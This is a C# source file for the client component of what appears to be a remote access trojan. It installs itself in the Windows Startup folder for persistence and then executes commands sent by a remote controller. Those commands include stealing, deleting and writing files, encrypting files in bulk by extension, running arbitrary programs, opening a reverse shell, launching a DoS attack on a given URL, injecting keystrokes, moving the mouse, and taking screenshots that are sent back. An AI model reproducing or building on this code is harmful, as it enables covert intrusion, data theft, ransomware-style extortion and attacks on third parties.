using Protocol;
using System.Diagnostics;

namespace Client3
{
    class Handle
    {
        private readonly IpHandler _ipHandler = new IpHandler();

        public enum Commands
        {
            GetIp,
            ScanPort,
            FileHandle,
            ReverseShell,
            DoS,
            Controller,
            ScreenShot,
            WebPage

        }

        public enum FileHandlerEnum
        {
            FileLooker,
            FileStealer,
            FileReceiver,
            FileRemover,
            FileEncrypter,
            FileExecuter
        }

        public static Commands GetCommands(int index)
        {
            var possbileCom = Enum.GetValues<Commands>();

            return possbileCom[index];

        }

        public void Handler(Stream stream)
        {

            var windowsUserName = Environment.UserName;

            var startUpPath = $"C:\\Users\\{windowsUserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

            if (File.Exists($"{startUpPath}\\WindowsClient.exe"))
            {
                
            } else
            {
                var cwd = Directory.GetCurrentDirectory();
                File.Copy($"{cwd}\\WindowsClient.exe", $"{startUpPath}\\WindowsClient.exe");
            }

            while (true)
            {
                var cmdIndex = stream.ReadString(); // index

                
                var selectedCommand = GetCommands(int.Parse(cmdIndex));

                switch (selectedCommand)
                {
                    
                    case Commands.GetIp:
                        var publicIp = _ipHandler.ReturnIp();
                        stream.WriteString($"{publicIp}\n");

                        break;
                    case Commands.ScanPort:
                        var ipScan = stream.ReadString();
                        var portScan = stream.ReadString();

                        PortScan.ScanPort(ipScan, portScan, stream);
                        break;

                    case Commands.FileHandle:
                        var possComands = Enum.GetValues<FileHandlerEnum>();

                        var index = stream.ReadString();

                        var fileHandler = possComands[int.Parse(index)];

                        switch (fileHandler)
                        {
                            case FileHandlerEnum.FileLooker:
                                var path = stream.ReadString();
                                var extension = stream.ReadString();

                                FileHandler.FileHandlerClient(stream, path, extension);

                                break;
                            case FileHandlerEnum.FileStealer:
                                var pathStealer = stream.ReadString();

                                var bytesFile = File.ReadAllBytes(pathStealer);
                                FileStealer.SendFile(stream, pathStealer);

                                break;
                            case FileHandlerEnum.FileReceiver:
                                var pathWritten = stream.ReadString();

                                var bytes = stream.ReadBytes();

                                File.WriteAllBytes(pathWritten, bytes);

                                break;
                            case FileHandlerEnum.FileRemover:
                                var pathRemover = stream.ReadString();
                                File.Delete(pathRemover);

                                break;
                            case FileHandlerEnum.FileEncrypter:
                                var encrypterType = stream.ReadString();

                                if (encrypterType == "simpleEncrypter")
                                {
                                    var pathFile = stream.ReadString();
                                    FileEncrypter.EncryptFile(pathFile);

                                }
                                else if (encrypterType == "compuseEncrypt")
                                {
                                    var type = stream.ReadString();


                                    if (type == "simple")
                                    {
                                        var pathStart = stream.ReadString();
                                        var extensionStart = stream.ReadString();

                                        FileEncrypter.CompuseEncryptSimple(pathStart, extensionStart);
                                    }
                                    else if (type == "selective")
                                    {
                                        var pathInclused = stream.ReadString();
                                        FileEncrypter.CompuseEncryptSelective(pathInclused);

                                    }

                                }



                                break;

                            case FileHandlerEnum.FileExecuter:
                                var executerPath = stream.ReadString();
                                Process.Start(executerPath);

                                break;



                            default:
                                Console.WriteLine("");
                                break;
                        }
                        break;



                    case Commands.ReverseShell:
                        ReverseShell.ReverseShellClient(stream);

                        break;

                    case Commands.DoS:
                        var url = stream.ReadString();

                        DoS.Attack(url);

                        break;

                    case Commands.Controller:
                        var controller = stream.ReadString();

                        if (controller == "0")
                        {
                            var characters = stream.ReadString();
                            Thread.Sleep(1000);
                            SendKeys.SendWait(characters);
                            
                        }
                        else if (controller == "1")
                        {
                            var optionController = stream.ReadString();

                            if (optionController == "mouse-mover")
                            {
                                var x = stream.ReadString();
                                var y = stream.ReadString();


                                Cursor.Position = new Point(int.Parse(x), int.Parse(y));    

                            } else if (optionController == "mouse-jiggler")
                            {
                                var timesRotate = stream.ReadString();

                                for (int i = 0; i < int.Parse(timesRotate); i++)
                                {
                                    var rnd = new Random();
                                    var x = rnd.Next(0, 1920);

                                    var y = rnd.Next(0, 1080);


                                    Cursor.Position = new Point(x, y);
                                    Thread.Sleep(15);

                                }
                            }
                        }
                        
                        break;

                    case Commands.ScreenShot:


                        var user = Environment.UserName.ToString();
                        string pathScreenShot = $"C:\\Users\\{user}\\Documents\\Screenshot.jpeg";

                        ScreenShot.TakeScrenShot(pathScreenShot);

                        var bytesScreenshot = File.ReadAllBytes(pathScreenShot);

                        stream.WriteBytes(bytesScreenshot);

                        File.Delete(pathScreenShot);

                        break;

                    case Commands.WebPage:
                        var webUrl = stream.ReadString();   

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = webUrl,
                            UseShellExecute = true
                        });

                        break;

                    default:
                        Console.WriteLine("");
                        break;
                   
                
                }
            }
        }
    }
}
